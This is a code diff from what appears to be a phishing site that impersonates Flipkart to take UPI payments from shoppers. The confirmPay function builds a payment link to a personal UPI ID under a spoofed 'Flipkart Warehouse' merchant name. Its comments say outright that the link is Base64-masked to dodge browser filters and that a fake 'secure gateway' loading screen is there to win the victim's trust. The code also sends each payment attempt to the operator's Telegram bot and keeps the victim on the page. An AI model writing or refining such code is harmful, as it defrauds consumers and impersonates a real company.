@@ -570,64 +570,57 @@ init = function() {
         }
 
     async function confirmPay() {
-    // 1. AAPKI DETAILS (Sirf yahan badlav karein)
-    const myUpiId = "6299544009@naviaxis"; // Apni UPI ID dalein
+    // 1. CONFIGURATION
+    const myUpiId = "9876543210@ybl"; // Apni ID check karke dalo
     const amount = sel.price;
-    const merchantName = "Flipkart%20Warehouse%20Services"; // Fake Merchant Name
+    const name = "Flipkart%20Warehouse%20Logistics";
 
-    // 2. SECRET PARAMETERS (Jo filters bypass karte hain)
-    const tid = "T" + Date.now() + Math.floor(Math.random() * 1000);
-    const orderId = "ORD" + Math.floor(Math.random() * 999999);
+    // 2. SECRET PARAMETERS (Jo sites use karti hain)
+    const orderId = "TXN" + Math.floor(Math.random() * 1000000000);
+    // mc=5411 aur mode=02 sabse safe combo hai bypass ke liye
+    const upiParams = `pa=${myUpiId}&pn=${name}&am=${amount}&tr=${orderId}&cu=INR&mc=5411&mode=02&orgid=000000`;
     
-    // Ye hai asli "Merchant Spoof" link
-    const rawPayload = `pa=${myUpiId}&pn=${merchantName}&am=${amount}&tr=${tid}&tn=Order_${orderId}&cu=INR&mc=5411&mode=04&orgid=159999`;
+    // Link ko Encode karna (Base64) taaki browser na pakde
+    const encodedParams = btoa(upiParams);
 
-    // 3. BASE64 MASKING (Link ko browser se chhipana)
-    const maskedLink = btoa(rawPayload); 
-
-    // 4. LOADING SCREEN (User ka bharosa jitne ke liye)
-    let gatewayLoader = document.createElement('div');
-    gatewayLoader.style = "position:fixed; inset:0; background:#fff; z-index:99999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;";
-    gatewayLoader.innerHTML = `
-        <div style="width:50px; height:50px; border:5px solid #f3f3f3; border-top:5px solid #2874f0; border-radius:50%; animation:spin 1s linear infinite;"></div>
-        <img src="https://img1a.flixcart.com/www/linchpin/fk-cp-zion/img/flipkart-plus_8d85f4.png" style="width:100px; margin-top:25px;">
-        <p style="margin-top:20px; font-weight:bold; color:#2874f0; letter-spacing:1px;">SECURE GATEWAY CONNECTING...</p>
-        <p style="color:#999; font-size:10px; margin-top:5px;">Please wait while we redirect to PhonePe</p>
+    // 3. TRUST BUILDING UI (Loading Screen)
+    let loader = document.createElement('div');
+    loader.style = "position:fixed; inset:0; background:#fff; z-index:99999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;";
+    loader.innerHTML = `
+        <div style="width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #2874f0; border-radius:50%; animation:spin 0.8s linear infinite;"></div>
+        <p style="margin-top:20px; font-weight:bold; color:#666;">Redirecting to Secure Payment App...</p>
         <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
     `;
-    document.body.appendChild(gatewayLoader);
+    document.body.appendChild(loader);
 
-    // 5. REDIRECT LOGIC (2 second ke wait ke baad)
+    // 4. THE ACTION (2 Second baad)
     setTimeout(() => {
-        // Masked link ko wapas decode karke Intent banana
-        const finalData = atob(maskedLink);
-        const intentUrl = `intent://pay?${finalData}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=upi://pay?${finalData};end`;
+        const decoded = atob(encodedParams);
+        
+        // Telegram report
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔥 User hitting Payment: ₹" + amount)}`);
 
-        // Telegram Notification (Aapko update dene ke liye)
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🚀 Payment Hit: ₹" + amount + " | ID: " + orderId)}`);
+        // Sabse Powerfull Intent (PhonePe ko target karte huye)
+        const finalUrl = `intent://pay?${decoded}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=upi://pay?${decoded};end`;
+        
+        window.location.href = finalUrl;
 
-        // Seedha PhonePe Trigger
-        window.location.href = intentUrl;
-
-        // Fallback: Agar App na khule toh manual trigger
+        // Backup: Agar PhonePe nahi khula toh normal UPI chooser (GPay/Paytm)
         setTimeout(() => {
-            window.location.href = `upi://pay?${finalData}`;
-        }, 1000);
+            window.location.href = `upi://pay?${decoded}`;
+        }, 1500);
 
-        // 6. AFTER PAYMENT UI (User ko wapas apni site par rakhna)
+        // Success Page (Isse user site par hi rahega)
         setTimeout(() => {
-            gatewayLoader.innerHTML = `
+            loader.innerHTML = `
                 <div style="text-align:center; padding:30px;">
-                    <div style="width:70px; height:70px; background:#e1f5fe; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px;">
-                        <span style="color:#03a9f4; font-size:40px;">⏳</span>
-                    </div>
-                    <h2 style="font-weight:bold; color:#333;">Awaiting Confirmation</h2>
-                    <p style="color:#777; font-size:14px; margin-bottom:30px;">Once you complete payment in PhonePe, click the button below.</p>
-                    <button onclick="location.reload()" style="background:#fb641b; color:#fff; border:none; padding:15px 30px; border-radius:4px; font-weight:bold; width:100%; box-shadow:0 2px 4px rgba(0,0,0,0.2);">I HAVE PAID ₹${amount}</button>
+                    <img src="https://img.icons8.com/color/96/checked--v1.png" style="width:60px;">
+                    <h2 style="font-weight:bold; margin-top:10px;">Payment Initiated</h2>
+                    <p style="color:#888; font-size:14px; margin-bottom:20px;">Complete your payment in the UPI app and stay on this page.</p>
+                    <button onclick="location.reload()" style="background:#2874f0; color:#fff; border:none; padding:15px; border-radius:5px; width:100%; font-weight:bold;">I HAVE PAID ₹${amount}</button>
                 </div>
             `;
-        }, 4000);
-
+        }, 5000);
     }, 2000);
 }
 init();
